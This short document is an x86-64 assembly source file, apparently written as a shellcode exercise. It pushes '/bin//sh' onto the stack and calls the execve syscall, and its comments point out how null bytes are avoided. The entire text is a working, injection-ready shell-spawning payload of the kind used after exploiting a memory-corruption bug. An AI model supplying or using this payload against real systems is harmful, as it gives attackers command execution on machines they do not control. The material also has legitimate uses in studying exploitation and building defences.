section .text
global _start
_start:
    push rax            ; push rax on stack
    xor rdx, rdx        ; clear important
    xor rsi, rsi        ; registers
    mov rbx, '/bin//sh' ; mov bin sh string into rbx
    push rbx            ; push string on stack
    push rsp            ; push stack pointer on stack
    pop rdi             ; rdi now points to the stack pointer
                        ; which points to the top of the stack
                        ; which should point to /bin//sh -> 0
    mov al, 59          ; mov execve syscall into eax/rax lower so no null bytes
    syscall             ; syscall
